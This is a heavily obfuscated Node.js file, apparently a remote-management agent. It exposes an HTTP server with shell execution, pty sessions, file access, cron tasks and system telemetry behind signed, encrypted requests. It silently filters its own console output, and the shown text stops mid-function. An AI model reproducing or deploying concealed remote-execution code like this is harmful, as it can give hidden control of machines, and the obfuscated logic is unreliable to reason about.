#!/usr/bin/env node
const a0aQ = a0b;
(function (a, b) {
    const aP = a0b, c = a();
    while (!![]) {
        try {
            const d = -parseInt(aP(0x2cc)) / 0x1 * (-parseInt(aP(0x780)) / 0x2) + -parseInt(aP(0x445)) / 0x3 * (-parseInt(aP(0x73a)) / 0x4) + -parseInt(aP(0x550)) / 0x5 + -parseInt(aP(0x5cc)) / 0x6 + parseInt(aP(0x1bc)) / 0x7 * (-parseInt(aP(0x5c0)) / 0x8) + -parseInt(aP(0x1e8)) / 0x9 + parseInt(aP(0x5ca)) / 0xa;
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0xebd78));
const a0c = [
    a0aQ(0x674),
    a0aQ(0x48d),
    a0aQ(0x415)
];
function a0d(a) {
    const aR = a0aQ, b = { 'fCVhV': aR(0x477) };
    return function (c, d, f) {
        const aS = aR, g = c[aS(0x496)]();
        if (a0c[aS(0x237)](h => g[aS(0x572)](h))) {
            if (typeof f === b[aS(0x28f)])
                f();
            return !![];
        }
        return a[aS(0x318)](this, arguments);
    };
}
process[a0aQ(0x19b)][a0aQ(0x1f8)] = a0d(process[a0aQ(0x19b)][a0aQ(0x1f8)]), process[a0aQ(0xc4)][a0aQ(0x1f8)] = a0d(process[a0aQ(0xc4)][a0aQ(0x1f8)]);
const a0f = require('express'), a0g = require(a0aQ(0x639)), a0h = require(a0aQ(0x1b9)), a0i = require('net'), a0j = require(a0aQ(0x522)), a0k = require(a0aQ(0x743)), a0l = require('fs'), a0m = require('fs')[a0aQ(0x4df)], a0n = require(a0aQ(0x6aa)), a0o = require('os'), a0p = require(a0aQ(0x6b2)), {
        exec: a0q,
        spawn: a0r
    } = require(a0aQ(0x137)), a0s = require('node-cron'), a0t = require('systeminformation'), {encrypt: a0u} = require(a0aQ(0x3e3)), a0v = require(a0aQ(0x336)), a0w = require(a0aQ(0x4c3)), a0x = require(a0aQ(0x541));
function a0y() {
    const aT = a0aQ, a = {
            'dMBoK': aT(0x2e6),
            'gcQRu': aT(0x2fd),
            'zmLqi': aT(0x38d),
            'vrOqp': function (b, c) {
                return b <= c;
            },
            'MGFuU': function (b, c) {
                return b + c;
            },
            'ctkCA': function (b, c) {
                return b >= c;
            },
            'mqPuk': function (b, c) {
                return b in c;
            }
        };
    try {
        const b = a0n[aT(0x211)](__dirname, a['dMBoK']);
        if (!a0l[aT(0x124)](b))
            return;
        for (let c of a0l['readFileSync'](b, a[aT(0x761)])[aT(0x316)](/\r?\n/)) {
            let d = c[aT(0x5d6)]();
            if (!d || d[aT(0x562)]('#'))
                continue;
            if (d[aT(0x562)](a[aT(0x214)]))
                d = d[aT(0x4a8)](0x7)[aT(0x656)]();
            const f = d[aT(0xfa)]('=');
            if (a[aT(0x31d)](f, 0x0))
                continue;
            const g = d[aT(0x4a8)](0x0, f)[aT(0x5d6)]();
            let h = d['slice'](a[aT(0x559)](f, 0x1))[aT(0x5d6)]();
            a[aT(0x2f5)](h['length'], 0x2) && (h[aT(0x562)]('\x22') && h[aT(0x642)]('\x22') || h[aT(0x562)]('\x27') && h[aT(0x642)]('\x27')) && (h = h['slice'](0x1, -0x1));
            if (g && !a[aT(0x414)](g, process.env))
                process.env[g] = h;
        }
    } catch (i) {
    }
}
a0y();
let a0z, a0A, a0B;
try {
    typeof Bun !== 'undefined' ? a0B = require(a0aQ(0x1e0)) : a0B = require(a0aQ(0x3cd));
} catch (a0aO) {
    console['error'](a0aQ(0x5cd)), console[a0aQ(0x5e4)](a0aQ(0x629) + a0aO[a0aQ(0x322)]), console[a0aQ(0x5e4)]('💡\x20修复建议:\x20请在项目目录下运行\x20npm\x20install\x20@lydell/node-pty'), process['exit'](0x1);
}
const a0C = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const aU = a0aQ, a = {
                'KVmLl': function (b, c) {
                    return b !== c;
                },
                'mgXUP': aU(0x5da)
            };
        return a['KVmLl'](typeof a0O, a[aU(0x27c)]) && a0O[aU(0x3f1)] !== undefined ? a0O[aU(0x3f1)] : 0x2;
    },
    'debug': a => {
        const aV = a0aQ, b = {
                'Lwfoz': function (c, d) {
                    return c <= d;
                }
            };
        b[aV(0x67e)](a0C[aV(0x41e)], a0C['LEVELS']['DEBUG']) && console[aV(0xb4)]('\x1b[90m[DEBUG]\x1b[0m\x20' + a);
    },
    'info': a => {
        const aW = a0aQ;
        a0C[aW(0x41e)] <= a0C[aW(0x619)][aW(0x694)] && console[aW(0xb4)](aW(0x3d6) + a);
    },
    'warn': a => {
        const aX = a0aQ, b = {
                'EpObu': function (c, d) {
                    return c <= d;
                }
            };
        b[aX(0x3ac)](a0C[aX(0x41e)], a0C[aX(0x619)][aX(0x6df)]) && console['log'](aX(0x750) + a);
    },
    'error': a => {
        const aY = a0aQ, b = {
                'EQPXk': function (c, d) {
                    return c <= d;
                }
            };
        b[aY(0x11a)](a0C[aY(0x41e)], a0C[aY(0x619)]['ERROR']) && console[aY(0xb4)](aY(0x5b6) + a);
    }
};
function a0D() {
    const aZ = a0aQ, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0o[aZ(0x242)](),
            process['cwd']()
        ];
    for (const b of a) {
        if (b && a0l[aZ(0x124)](b) && a0l[aZ(0x1a2)](b)['isDirectory']())
            return b;
    }
    return process['cwd']();
}
function a0E() {
    const b0 = a0aQ;
    let a = null;
    try {
        a = a0o[b0(0x242)]();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l[b0(0x124)](d) && a0l[b0(0x1a2)](d)[b0(0x479)]())
            return d;
        if (d)
            console[b0(0xb4)](b0(0xbf) + d);
    }
    return console[b0(0xb4)](b0(0x1ec) + process['cwd']()), process[b0(0x2f7)]();
}
class a0F {
    constructor(a = 'ok') {
        this['status'] = a;
    }
}
class a0G extends a0F {
    constructor(a = 'ok', b = 0x0) {
        super(a), this['count'] = b;
    }
}
class a0H extends a0F {
    constructor() {
        const b1 = a0aQ, a = { 'AKFQM': '14|3|8|10|11|15|2|6|9|0|1|12|7|13|4|5' }, b = a[b1(0x31c)][b1(0x316)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['os'] = '';
                continue;
            case '1':
                this[b1(0x307)] = '';
                continue;
            case '2':
                this['ipv4'] = null;
                continue;
            case '3':
                this['arch'] = '';
                continue;
            case '4':
                this[b1(0x1d7)] = '';
                continue;
            case '5':
                this['noise_key'] = null;
                continue;
            case '6':
                this['ipv6'] = null;
                continue;
            case '7':
                this[b1(0x321)] = a0O['AGENT_VERSION'];
                continue;
            case '8':
                this['cpu_cores'] = 0x0;
                continue;
            case '9':
                this[b1(0x152)] = 0x0;
                continue;
            case '10':
                this[b1(0x585)] = '';
                continue;
            case '11':
                this[b1(0x5a0)] = 0x0;
                continue;
            case '12':
                this[b1(0x37a)] = 0x0;
                continue;
            case '13':
                this[b1(0x649)] = '';
                continue;
            case '14':
                super();
                continue;
            case '15':
                this[b1(0x61c)] = '';
                continue;
            }
            break;
        }
    }
}
class a0I extends a0F {
    constructor() {
        const b2 = a0aQ;
        super(), this[b2(0x4c9)] = { 'usage': 0x0 }, this['ram'] = {
            'total': 0x0,
            'used': 0x0
        }, this['swap'] = {
            'total': 0x0,
            'used': 0x0
        }, this[b2(0x4c6)] = {
            'load1': 0x0,
            'load5': 0x0,
            'load15': 0x0
        }, this[b2(0x23c)] = {
            'total': 0x0,
            'used': 0x0
        }, this['network'] = {
            'up': 0x0,
            'down': 0x0,
            'totalUp': 0x0,
            'totalDown': 0x0
        }, this[b2(0xf5)] = {
            'tcp': 0x0,
            'udp': 0x0
        }, this['uptime'] = 0x0, this[b2(0x69c)] = 0x0, this['message'] = '';
    }
}
class a0J extends a0F {
    constructor() {
        const b3 = a0aQ, a = { 'zBhfB': '4|3|2|0|1' }, b = a[b3(0x3d8)][b3(0x316)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[b3(0x246)] = ![];
                continue;
            case '1':
                this[b3(0x708)] = '';
                continue;
            case '2':
                this[b3(0x21d)] = 0x0;
                continue;
            case '3':
                this['result'] = '';
                continue;
            case '4':
                super();
                continue;
            }
            break;
        }
    }
}
class a0K {
    constructor() {
        const b4 = a0aQ, a = { 'MVffo': b4(0x5bf) }, b = a[b4(0x15a)][b4(0x316)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[b4(0x608)] = '';
                continue;
            case '1':
                this[b4(0x52c)] = 0x0;
                continue;
            case '2':
                this[b4(0x6aa)] = '';
                continue;
            case '3':
                this[b4(0x615)] = '';
                continue;
            case '4':
                this[b4(0x2f6)] = '';
                continue;
            case '5':
                this[b4(0x4ae)] = '';
                continue;
            case '6':
                this[b4(0xff)] = '';
                continue;
            case '7':
                this[b4(0x6ef)] = '';
                continue;
            }
            break;
        }
    }
}
class a0L {
    constructor() {
        const b5 = a0aQ, a = { 'JjWxx': b5(0x706) }, b = a[b5(0x27f)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[b5(0x507)] = ![];
                continue;
            case '1':
                this['readable'] = ![];
                continue;
            case '2':
                this[b5(0x6ef)] = '';
                continue;
            case '3':
                this[b5(0x615)] = '';
                continue;
            case '4':
                this[b5(0x1c7)] = ![];
                continue;
            case '5':
                this['mode'] = '';
                continue;
            case '6':
                this[b5(0x2f6)] = '';
                continue;
            case '7':
                this[b5(0x6aa)] = '';
                continue;
            }
            break;
        }
    }
}
class a0M extends a0F {
    constructor() {
        const b6 = a0aQ;
        super(), this[b6(0x4a6)] = [];
    }
}
class a0N {
    static ['_generateRawKeypair']() {
        const b7 = a0aQ, a = {
                'TfVHN': b7(0x169),
                'tJjoU': 'jwk',
                'IfPhF': b7(0x6b9),
                'ZAJTN': function (i, j) {
                    return i !== j;
                },
                'tYlMd': b7(0x4d6)
            }, {
                privateKey: b,
                publicKey: c
            } = a0k[b7(0x2ed)](a[b7(0x142)]), d = b[b7(0x47f)]({ 'format': a['tJjoU'] }), f = c[b7(0x47f)]({ 'format': a[b7(0xea)] }), g = Buffer[b7(0x3e1)](d['d'], a['IfPhF']), h = Buffer[b7(0x3e1)](f['x'], a[b7(0x29e)]);
        return (a['ZAJTN'](g[b7(0x4a5)], 0x20) || a[b7(0x32c)](h['length'], 0x20)) && a0C[b7(0x5e4)](b7(0x16a)), {
            'private_b64': g[b7(0x496)](a[b7(0x285)]),
            'public_b64': h[b7(0x496)]('base64')
        };
    }
    static ['generateSingle'](a) {
        const b8 = a0aQ, b = this[b8(0x520)]();
        return {
            'role': a,
            'private_b64': b[b8(0x340)],
            'public_b64': b[b8(0x5ae)]
        };
    }
    static [a0aQ(0x72b)](a = a0aQ(0x1fb), b = a0aQ(0x500)) {
        const b9 = a0aQ, c = {
                'control': this['generateSingle'](a),
                'agent': this[b9(0x785)](b)
            };
        return c;
    }
}
class a0O {
    static [a0aQ(0x5be)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0aQ(0x49f)] = (process.env.EXEC_SHELL || a0aQ(0x11d))['toLowerCase']() === a0aQ(0x11d);
    static [a0aQ(0x2ae)] = (process.env.DEBUG || a0aQ(0x2be))[a0aQ(0x2c1)]() === a0aQ(0x11d);
    static ['TIMESTAMP_WINDOW'] = parseInt(process.env.TIMESTAMP_WINDOW || '3600');
    static [a0aQ(0x3f1)] = parseInt(process.env.LOG_LEVEL || (this[a0aQ(0x2ae)] ? '0' : '2'), 0xa);
    static [a0aQ(0x26b)] = a0O['_getConfigValue'](a0aQ(0x259), 'keys/agent_ecdsa_pub.pem') || 'ECDSA公钥内容';
    static [a0aQ(0x356)] = a0O[a0aQ(0xb2)](a0aQ(0x1c8), a0aQ(0x11e)) || 'ECIES公钥内容';
    static [a0aQ(0x582)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static ['TEMPKEY_MAX_TTL_HOURS'] = parseInt(process.env.TEMPKEY_MAX_TTL || '168', 0xa);
    static [a0aQ(0x167)] = a0E();
    static [a0aQ(0x447)] = parseInt(process.env.MAX_UPLOAD_SIZE || '104857600');
    static [a0aQ(0x738)] = (process.env.FOLLOW_SYMLINKS || a0aQ(0x2be))[a0aQ(0x2c1)]() === 'true';
    static ['FILE_AUDIT_LOG'] = (process.env.FILE_AUDIT_LOG || a0aQ(0x11d))[a0aQ(0x2c1)]() === a0aQ(0x11d);
    static ['InitTask'] = !![];
    static [a0aQ(0x6ca)] = [];
    static [a0aQ(0x3c5)] = {};
    static ['cronloop'] = ![];
    static [a0aQ(0x159)] = parseInt(process.env.TASK_TIMEOUT || a0aQ(0x632));
    static [a0aQ(0x233)] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0aQ(0x6b0)] = [];
    static [a0aQ(0x5aa)] = [];
    static [a0aQ(0x40f)] = parseInt(process.env.MAX_TASK_LOG || a0aQ(0x764));
    static [a0aQ(0x160)] = process.env.HOST || '0.0.0.0';
    static [a0aQ(0x2a2)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0aQ(0x5f9));
    static [a0aQ(0x3f5)] = (process.env.KMODE || '0')['trim']() || '0';
    static ['KNAME'] = (process.env.KNAME || '')['trim']();
    static [a0aQ(0x1d9)] = (process.env.KNAME_KEY || '')[a0aQ(0x5d6)]();
    static ['KPATH'] = process.env.KPATH || '';
    static ['AGENT_VERSION'] = process.env.AGENT_VERSION || a0aQ(0x25f);
    static [a0aQ(0x57e)] = a0k[a0aQ(0x36f)](0x20)[a0aQ(0x496)]('base64');
    static ['NOISE_KEYS_INTERNAL'] = a0N[a0aQ(0x72b)]();
    static ['wsDowngradeToken']() {
        const ba = a0aQ, a = {
                'kTfuY': ba(0x3da),
                'bXHfz': 'base64',
                'pgnzI': 'kisama-ws-token-v1'
            };
        return a0k[ba(0x2a5)](a['kTfuY'], Buffer[ba(0x3e1)](this['SESSION_KEY'], a['bXHfz']))[ba(0x3d9)](a['pgnzI'])['digest']('base64');
    }
    static ['rotateOperationalSecrets']() {
        const bb = a0aQ, a = { 'lJLkf': bb(0x4d6) }, b = a0N[bb(0x72b)]();
        this[bb(0x5ea)][bb(0x52d)] = b[bb(0x52d)], this[bb(0xbe)][bb(0x50b)][bb(0x783)] = b[bb(0x52d)]['private_b64'], this[bb(0x57e)] = a0k[bb(0x36f)](0x20)[bb(0x496)](a[bb(0xc0)]), this[bb(0xab)] = null, this[bb(0x1f2)] = 0x0, this['_status_cache'] = null, this['_status_cache_time'] = 0x0, a0C[bb(0x165)](bb(0x210));
    }
    static [a0aQ(0xbe)] = {
        'controller': { 'private': this[a0aQ(0x5ea)][a0aQ(0x52d)][a0aQ(0x340)] },
        'agent': { 'public': this[a0aQ(0x5ea)][a0aQ(0x411)][a0aQ(0x5ae)] }
    };
    static [a0aQ(0x2c4)] = 0xe10;
    static [a0aQ(0x178)] = 0x1e;
    static [a0aQ(0xab)] = null;
    static [a0aQ(0x1f2)] = 0x0;
    static ['_baseinfo_fetch_promise'] = null;
    static ['_status_cache'] = null;
    static ['_status_cache_time'] = 0x0;
    static ['_status_fetch_promise'] = null;
    static ['_getConfigValue'](a, b) {
        const bc = a0aQ, c = process.env[a];
        if (c)
            return c;
        const d = a0n[bc(0x211)](__dirname, b);
        if (a0l['existsSync'](d))
            try {
                return a0l['readFileSync'](d, 'utf8')[bc(0x5d6)]();
            } catch (f) {
            }
        return '';
    }
    static [a0aQ(0x370)]() {
        const bd = a0aQ, a = {
                'CCPSN': 'ECDSA_PUBKEY:\x20未设置环境变量且文件\x20keys/agent_ecdsa_pub.pem\x20不存在',
                'SPahU': bd(0x3d2),
                'igwvr': function (b, c) {
                    return b > c;
                },
                'aaNBP': bd(0x668),
                'btQsx': bd(0x1c2),
                'mjBgl': bd(0x298)
            };
        if (!this[bd(0x2ae)]) {
            const b = [];
            !this[bd(0x26b)] && b[bd(0x33a)](a['CCPSN']);
            !this[bd(0x356)] && b[bd(0x33a)](a[bd(0x303)]);
            if (a['igwvr'](b[bd(0x4a5)], 0x0)) {
                const c = a[bd(0x346)]['split']('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        b[bd(0xef)](f => a0C['error'](bd(0x602) + f));
                        continue;
                    case '1':
                        a0C[bd(0x5e4)](bd(0x539));
                        continue;
                    case '2':
                        process[bd(0x45f)](0x1);
                        continue;
                    case '3':
                        a0C[bd(0x1cc)](a['btQsx']);
                        continue;
                    case '4':
                        a0C[bd(0x1cc)](a[bd(0x126)]);
                        continue;
                    case '5':
                        a0C[bd(0x1cc)](bd(0x366));
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static ['merge'](a = {}) {
        const be = a0aQ, b = {
                'Jcyiz': function (c, d) {
                    return c !== d;
                },
                'SddSi': function (c, d, f) {
                    return c(d, f);
                },
                'TVlzV': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        b[be(0x5a1)](a[be(0x2a2)], undefined) && b[be(0x5a1)](a[be(0x2a2)], null) && (this[be(0x2a2)] = b[be(0x44b)](parseInt, b[be(0x17c)](String, a[be(0x2a2)]), 0xa)), a[be(0x26b)] && (this[be(0x26b)] = a[be(0x26b)][be(0x5d6)]()), a[be(0x356)] && (this[be(0x356)] = a[be(0x356)][be(0x5d6)]());
    }
}
class a0P {
    constructor() {
        const bf = a0aQ;
        this[bf(0x61e)] = null, this[bf(0x150)] = null;
    }
    [a0aQ(0x4d8)](a) {
        const bg = a0aQ, b = { 'cBVEk': bg(0x1d4) }, c = b[bg(0x24c)][bg(0x316)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                a0C['info'](bg(0xac) + this[bg(0x61e)][bg(0x3d7)] + ',\x20有效期\x20' + a + bg(0x375));
                continue;
            case '1':
                return this[bg(0x61e)];
            case '2':
                this[bg(0x54f)]();
                continue;
            case '3':
                this['_key'] = this[bg(0x5ba)](a);
                continue;
            case '4':
                if (this[bg(0x61e)])
                    return this[bg(0x61e)];
                continue;
            }
            break;
        }
    }
    [a0aQ(0x4bc)]() {
        const bh = a0aQ;
        this[bh(0x54f)]();
        if (this[bh(0x61e)])
            return this[bh(0x61e)]['ecdsa_vk'];
        return null;
    }
    [a0aQ(0x65e)]() {
        const bi = a0aQ;
        this[bi(0x54f)]();
        if (this['_key'])
            return this['_key'][bi(0x382)];
        return null;
    }
    ['_expireCurrent']() {
        const bj = a0aQ, a = {
                'ultoe': function (b, c) {
                    return b === c;
                },
                'uvNOV': bj(0x477)
            };
        if (this[bj(0x61e)] && this[bj(0x5e7)](this[bj(0x61e)])) {
            const b = this['_key']['key_id'];
            this[bj(0x61e)] = null, a0C[bj(0x165)]('🔄\x20[TempKey]\x20临时密钥已过期:\x20key_id=' + b);
            if (a['ultoe'](typeof this[bj(0x150)], a['uvNOV']))
                try {
                    this[bj(0x150)]();
                } catch (c) {
                    a0C[bj(0x5e4)](bj(0x714) + c[bj(0x322)]);
                }
        }
    }
    ['_isExpired'](a) {
        const bk = a0aQ, b = {
                'MyIgk': function (c, d) {
                    return c / d;
                }
            };
        return Math[bk(0x686)](b['MyIgk'](Date['now'](), 0x3e8)) >= a[bk(0x5d4)];
    }
    ['_generate'](a) {
        const bl = a0aQ, b = {
                'klpIF': bl(0x182),
                'rFagY': bl(0x4a2),
                'HErsh': bl(0x465),
                'UAIVI': function (l, m) {
                    return l * m;
                },
                'EyxPN': bl(0x48a),
                'uKzaX': function (l, m) {
                    return l + m;
                }
            }, {
                privateKey: c,
                publicKey: d
            } = a0k[bl(0x2ed)]('ec', { 'namedCurve': b[bl(0x689)] }), f = c[bl(0x47f)]({
                'type': bl(0x486),
                'format': 'pem'
            }), g = d[bl(0x47f)]({
                'type': b[bl(0x46c)],
                'format': b['HErsh']
            }), h = a0k[bl(0x36f)](0x20), i = Buffer[bl(0x3e1)](a0A[bl(0x349)](h, ![])), j = Math[bl(0x686)](Date['now']() / 0x3e8), k = b['UAIVI'](a, 0xe10);
        return {
            'key_id': a0k[bl(0x36f)](0x8)[bl(0x496)](b[bl(0x230)]),
            'created_at': j,
            'expires_at': b[bl(0x6c5)](j, k),
            'ttl_seconds': k,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h['toString']('hex'),
            'ecies_public_key': i[bl(0x496)](bl(0x48a)),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0Q {
    constructor(a, b) {
        const bm = a0aQ, c = {
                'FbpxP': function (d, f) {
                    return d(f);
                },
                'MKRZF': function (d, f) {
                    return d(f);
                },
                'lILIj': 'P-256'
            };
        this[bm(0x365)] = null, this[bm(0x68b)] = null;
        if (a)
            try {
                const d = a['trim']();
                if (d[bm(0x562)]('-----BEGIN'))
                    this[bm(0x365)] = a0k[bm(0x4e9)](d);
                else {
                    const f = Buffer[bm(0x3e1)](d, bm(0x4d6)), g = a0z[bm(0xc5)][bm(0x173)](f), h = g['toBytes'](![]), i = m => m['toString'](bm(0x4d6))[bm(0x4c2)](/\+/g, '-')[bm(0x4c2)](/\//g, '_')[bm(0x4c2)](/=/g, ''), j = c[bm(0x473)](i, Buffer[bm(0x3e1)](h[bm(0x4a8)](0x1, 0x21))), k = c[bm(0x76e)](i, Buffer[bm(0x3e1)](h[bm(0x4a8)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': c['lILIj'],
                            'x': j,
                            'y': k
                        };
                    this[bm(0x365)] = a0k[bm(0x4e9)]({
                        'key': l,
                        'format': 'jwk'
                    });
                }
            } catch (m) {
                a0C[bm(0x5e4)]('⚠️\x20ECDSA公钥加载失败:\x20' + m['message']), this[bm(0x365)] = null;
            }
        if (b)
            try {
                this['eciesPubkey'] = a0v[bm(0x595)](b['trim']());
            } catch (n) {
                a0C[bm(0x165)](bm(0x2f2) + n[bm(0x322)]);
            }
    }
    [a0aQ(0x141)](a, b, c, d, f, g, h = null) {
        const bn = a0aQ, i = {
                'dLDXw': 'ECDSA\x20public\x20key\x20not\x20loaded',
                'qWLTs': function (j, k) {
                    return j(k);
                },
                'fbUqc': function (j, k) {
                    return j > k;
                },
                'RuEzW': function (j, k) {
                    return j - k;
                },
                'QHRNL': function (j, k, l, m, n, o) {
                    return j(k, l, m, n, o);
                },
                'zrWlK': bn(0x1a1),
                'LQqBu': 'temp',
                'AWHUN': bn(0x709)
            };
        if (!this[bn(0x365)])
            throw new Error(i['dLDXw']);
        try {
            const j = i[bn(0x4cf)](parseInt, f), k = Math[bn(0x686)](Date['now']() / 0x3e8);
            if (i[bn(0x6ab)](Math['abs'](k - j), a0O[bn(0x3aa)]))
                throw new Error(bn(0x46d) + Math[bn(0x264)](i[bn(0x704)](k, j)) + bn(0x278) + a0O[bn(0x3aa)] + 's');
            const l = i[bn(0x5c4)](a0R, a, b, c, d, f);
            if (this[bn(0x333)](this[bn(0x365)], l, g))
                return i[bn(0x144)];
            if (h && this['_verifyWith'](h, l, g))
                return i['LQqBu'];
            throw new Error(i[bn(0x6e3)]);
        } catch (m) {
            throw new Error(bn(0x213) + m['message']);
        }
    }
    [a0aQ(0x333)](a, b, c) {
        const bo = a0aQ, d = { 'Uitma': bo(0x676) };
        if (!a)
            return ![];
        try {
            const f = a0v['toByteArray'](c), g = a0k[bo(0x168)](d[bo(0x6e9)]);
            return g['update'](b), g['verify'](a, f);
        } catch (h) {
            return ![];
        }
    }
    [a0aQ(0x310)](a, b = null) {
        const bp = a0aQ, c = {
                'YriZC': 'ECIES\x20public\x20key\x20not\x20initialized,\x20cannot\x20encrypt\x20response',
                'mmHHx': bp(0x448),
                'URhHa': 'base64'
            };
        if (a0O[bp(0x2ae)])
            return JSON[bp(0x769)](a);
        if (!this['eciesPubkey'])
            throw new Error(c[bp(0x1df)]);
        try {
            const d = JSON[bp(0x769)](a), f = Buffer['from'](d, c[bp(0x41a)]), g = b || Buffer[bp(0x3e1)](this[bp(0x68b)]), h = a0u(g, f);
            return Buffer[bp(0x3e1)](h)[bp(0x496)](c[bp(0x2a0)]);
        } catch (i) {
            throw new Error(bp(0x2f1) + i['message']);
        }
    }
    [a0aQ(0x151)](a, b) {
        const bq = a0aQ, c = {
                'FRYVu': function (d, f) {
                    return d !== f;
                },
                'SqOzK': 'AES\x20Decrypt\x20Error:\x20Key\x20must\x20be\x20exactly\x2032\x20bytes\x20for\x20AES-256.',
                'CPgBP': bq(0x4d6),
                'CAUYx': bq(0x2fd),
                'VPuBP': bq(0x518),
                'rpuJb': bq(0x3ce)
            };
        if (!b || c[bq(0x560)](b['length'], 0x20))
            throw new Error(c[bq(0x66e)]);
        try {
            const d = Buffer[bq(0x3e1)](a, c[bq(0x64f)])['toString'](c[bq(0x43b)]), f = JSON[bq(0x4b2)](d);
            if (!f[bq(0x726)] || !f[bq(0x54c)] || !f[bq(0x5f5)])
                throw new Error(c[bq(0x130)]);
            const g = Buffer[bq(0x3e1)](f[bq(0x726)], c['CPgBP']), h = Buffer[bq(0x3e1)](f['tag'], bq(0x4d6)), i = Buffer[bq(0x3e1)](f['ciphertext'], c[bq(0x64f)]), j = a0k['createDecipheriv'](c['rpuJb'], b, g);
            j[bq(0x59d)](h);
            let k = j[bq(0x3d9)](i, null, c[bq(0x43b)]);
            return k += j[bq(0x49e)](c[bq(0x43b)]), k;
        } catch (l) {
            throw new Error(bq(0x4c7) + l[bq(0x322)]);
        }
    }
}
function a0R(a, b, c, d, f) {
    const br = a0aQ, g = {
            'zqjuF': 'sha256',
            'MWozP': br(0x48a)
        };
    return !c && (c = a0k[br(0x4e4)](g[br(0x66c)])[br(0x3d9)](Buffer[br(0x36a)](0x0))['digest'](g['MWozP'])), a + '\x0a' + b + '\x0a' + c + '\x0a' + d + '\x0a' + f;
}
function a0S(a, b = null) {
    const bs = a0aQ, c = {
            'DzlkT': function (d, f) {
                return d === f;
            },
            'foUiz': 'string',
            'Rsqgz': bs(0x2be),
            'LEzvc': bs(0x243),
            'aMJEt': bs(0x70f),
            'EBQsC': bs(0xfc),
            'BgAWT': bs(0x52b),
            'exUZt': function (d, f) {
                return d === f;
            },
            'iSxXy': bs(0x6c0),
            'oDUWI': bs(0x2fd),
            'gvazt': function (d, f) {
                return d === f;
            },
            'FSQas': bs(0x58e),
            'cJjuj': bs(0x1a5),
            'FjYtv': function (d) {
                return d();
            },
            'tulEr': bs(0x609),
            'WnwWe': bs(0x46a),
            'FlcsF': '/api/baseinfo',
            'NaeLb': bs(0x679),
            'ybinm': bs(0x1db),
            'BVKNk': bs(0x3dc),
            'jNZFS': 'x-timestamp',
            'eVHNS': 'X-Timestamp',
            'HxqtC': 'x-auth-token',
            'GGNDO': bs(0x1fc),
            'ubWVk': function (d, f) {
                return d || f;
            },
            'sZKot': bs(0x42a),
            'SDHbr': function (d, f) {
                return d === f;
            },
            'DYfgL': bs(0x448),
            'LObTs': function (d, f) {
                return d > f;
            },
            'DlYZc': function (d, f) {
                return d === f;
            },
            'ZoDHL': bs(0x1a1),
            'ewGXh': function (d) {
                return d();
            },
            'jQqjX': bs(0x23d),
            'EXHDj': bs(0x4d6),
            'yISFY': bs(0x67d),
            'vowqb': function (d, f) {
                return d === f;
            }
        };
    return async (d, f, g) => {
        const bt = bs;
        if (d['path'][bt(0x562)](c[bt(0x3fd)]))
            return c[bt(0x612)](g);
        const h = f['send'];
        f['send'] = function (n) {
            const bu = bt;
            if (a0O[bu(0x2ae)]) {
                const o = c[bu(0x5b1)](typeof n, c[bu(0x37e)]) ? n : Buffer[bu(0xc9)](n) ? n : JSON[bu(0x769)](n);
                return f[bu(0x5de)](bu(0x58e), c[bu(0x55e)]), f[bu(0x5de)](c['LEzvc'], Buffer['byteLength'](o)['toString']()), h[bu(0x5e6)](this, o);
            }
            if (f[bu(0x514)](c['aMJEt']) && f[bu(0x514)](c['aMJEt'])[bu(0x572)](c[bu(0x61f)]))
                try {
                    const p = typeof n === c[bu(0x37e)] ? JSON[bu(0x4b2)](n) : n;
                    if (d[bu(0x114)]) {
                        let q = null;
                        d[bu(0x67b)] === c[bu(0x431)] && b && (q = b[bu(0x65e)]());
                        const r = a[bu(0x310)](p, q), s = c[bu(0x3b0)](typeof r, c['foUiz']) ? r : JSON[bu(0x769)](r);
                        return f[bu(0x5de)](bu(0x58e), 'true'), f['set'](c['iSxXy'], a0O[bu(0x345)]), f[bu(0x5de)](c['LEzvc'], Buffer[bu(0x482)](s, c[bu(0x4ff)])['toString']()), h['call'](this, s);
                    } else {
                        const t = c['gvazt'](typeof n, 'string') ? n : JSON[bu(0x769)](p);
                        return f[bu(0x5de)](c[bu(0xe1)], Buffer['byteLength'](t, bu(0x2fd))[bu(0x496)]()), h[bu(0x5e6)](this, t);
                    }
                } catch (u) {
                    if (!f['headersSent']) {
                        const v = JSON['stringify']({ 'error': bu(0x68a) + u['message'] });
                        return f['status'](0x1f4), f[bu(0x5de)](bu(0x70f), c[bu(0x61f)]), f[bu(0x5de)](c[bu(0xe1)], Buffer[bu(0x482)](v, bu(0x2fd))[bu(0x496)]()), h[bu(0x5e6)](this, v);
                    }
                    throw u;
                }
            return h[bu(0x5e6)](this, n);
        };
        const i = f[bt(0x4e5)];
        f[bt(0x4e5)] = function (...n) {
            const bv = bt;
            return a0O[bv(0x2ae)] && !f[bv(0x514)](c[bv(0x118)]) && f[bv(0x5de)](bv(0x58e), c[bv(0x55e)]), i[bv(0x318)](this, n);
        };
        if (d[bt(0x1c9)] === c[bt(0x15e)] || c['DzlkT'](d[bt(0x1c9)], c[bt(0x195)]))
